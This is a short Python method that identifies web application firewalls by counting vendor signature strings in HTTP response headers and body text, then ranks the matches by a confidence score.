    def detect(self, headers: Dict[str, str], body: str) -> List[Dict]:
        """Detect WAF from response headers and body"""
        findings = []
        combined = ""

        if headers:
            for k, v in headers.items():
                combined += f"{k.lower()}: {v.lower()} "
        if body:
            combined += body.lower()[:5000]

        for waf_name, signatures in self.waf_signatures.items():
            match_count = 0
            for sig in signatures:
                if sig.lower() in combined:
                    match_count += 1

            if match_count > 0:
                confidence = min(match_count / len(signatures) * 100, 100)
                findings.append({
                    "waf": waf_name, "confidence": confidence,
                    "matches": match_count, "total": len(signatures)
                })

        findings.sort(key=lambda x: x["confidence"], reverse=True)
        return findings

